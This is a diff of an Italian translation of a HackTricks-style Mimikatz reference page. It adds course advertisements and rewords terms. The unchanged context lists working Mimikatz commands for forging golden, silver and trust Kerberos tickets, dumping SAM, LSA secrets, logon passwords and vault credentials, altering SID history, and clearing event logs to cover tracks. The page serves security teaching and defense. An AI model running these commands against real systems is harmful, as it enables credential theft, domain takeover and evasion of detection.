@@ -15,15 +15,22 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+
+{% embed url="https://academy.8ksec.io/" %}
+
+
 **Questa pagina si basa su una di [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Controlla l'originale per ulteriori informazioni!
 
 ## LM e Clear-Text in memoria
 
 A partire da Windows 8.1 e Windows Server 2012 R2, sono state implementate misure significative per proteggere contro il furto di credenziali:
 
-- **Gli hash LM e le password in chiaro** non sono più memorizzati in memoria per migliorare la sicurezza. Un'impostazione specifica del registro, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, deve essere configurata con un valore DWORD di `0` per disabilitare l'autenticazione Digest, assicurando che le password "in chiaro" non vengano memorizzate nella cache in LSASS.
+- **LM hash e password in chiaro** non sono più memorizzati in memoria per migliorare la sicurezza. Una specifica impostazione del registro, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, deve essere configurata con un valore DWORD di `0` per disabilitare l'autenticazione Digest, assicurando che le password "in chiaro" non siano memorizzate nella cache in LSASS.
 
-- **La protezione LSA** è stata introdotta per proteggere il processo dell'Autorità di Sicurezza Locale (LSA) dalla lettura non autorizzata della memoria e dall'iniezione di codice. Questo viene realizzato contrassegnando LSASS come processo protetto. L'attivazione della protezione LSA comporta:
+- **LSA Protection** è stata introdotta per proteggere il processo dell'Autorità di Sicurezza Locale (LSA) dalla lettura non autorizzata della memoria e dall'iniezione di codice. Questo viene realizzato contrassegnando LSASS come processo protetto. L'attivazione della protezione LSA comporta:
 1. Modificare il registro in _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ impostando `RunAsPPL` su `dword:00000001`.
 2. Implementare un Oggetto Criteri di Gruppo (GPO) che applica questa modifica del registro sui dispositivi gestiti.
 
@@ -49,7 +56,7 @@ La manomissione dei registri eventi in Mimikatz comporta due azioni principali: 
 #### Cancellazione dei Registri Eventi
 
 - **Comando**: Questa azione è mirata a eliminare i registri eventi, rendendo più difficile tracciare attività dannose.
-- Mimikatz non fornisce un comando diretto nella sua documentazione standard per cancellare i registri eventi direttamente tramite la sua riga di comando. Tuttavia, la manipolazione dei registri eventi comporta tipicamente l'uso di strumenti di sistema o script al di fuori di Mimikatz per cancellare registri specifici (ad es., utilizzando PowerShell o Windows Event Viewer).
+- Mimikatz non fornisce un comando diretto nella sua documentazione standard per cancellare i registri eventi direttamente tramite la sua riga di comando. Tuttavia, la manipolazione dei registri eventi comporta tipicamente l'uso di strumenti di sistema o script al di fuori di Mimikatz per cancellare registri specifici (ad esempio, utilizzando PowerShell o Windows Event Viewer).
 
 #### Funzione Sperimentale: Patchare il Servizio Event
 
@@ -80,20 +87,20 @@ Esempio:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
-### Creazione del Biglietto Argento
+### Creazione di Silver Ticket
 
-I Biglietti Argento concedono accesso a servizi specifici. Comando chiave e parametri:
+I Silver Ticket concedono accesso a servizi specifici. Comando chiave e parametri:
 
-- Comando: Simile al Biglietto d'Oro ma mira a servizi specifici.
+- Comando: Simile al Golden Ticket ma mira a servizi specifici.
 - Parametri:
 - `/service`: Il servizio da mirare (ad es., cifs, http).
-- Altri parametri simili al Biglietto d'Oro.
+- Altri parametri simili al Golden Ticket.
 
 Esempio:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
-### Creazione di Trust Ticket
+### Creazione del Trust Ticket
 
 I Trust Ticket vengono utilizzati per accedere alle risorse tra domini sfruttando le relazioni di fiducia. Comando chiave e parametri:
 
@@ -147,7 +154,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **LSADUMP::SAM**: Accedi al database SAM locale.
 - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Decripta segreti memorizzati nel registro.
+- **LSADUMP::Secrets**: Decripta i segreti memorizzati nel registro.
 - `mimikatz "lsadump::secrets" exit`
 
 - **LSADUMP::SetNTLM**: Imposta un nuovo hash NTLM per un utente.
@@ -174,10 +181,10 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **SEKURLSA::LogonPasswords**: Mostra le credenziali per gli utenti connessi.
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: Estrai ticket Kerberos dalla memoria.
+- **SEKURLSA::Tickets**: Estrai i ticket Kerberos dalla memoria.
 - `mimikatz "sekurlsa::tickets /export" exit`
 
-### Manipolazione di SID e Token
+### Manipolazione di Sid e Token
 
 - **SID::add/modify**: Cambia SID e SIDHistory.
 - Aggiungi: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
@@ -199,6 +206,12 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Estrai password da Windows Vault.
 - `mimikatz "vault::cred /patch" exit`
 
+
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Approfondisci la tua esperienza in **Sicurezza Mobile** con 8kSec Academy. Padroneggia la sicurezza di iOS e Android attraverso i nostri corsi autogestiti e ottieni la certificazione:
+
+{% embed url="https://academy.8ksec.io/" %}
 
 {% hint style="success" %}
 Impara e pratica Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
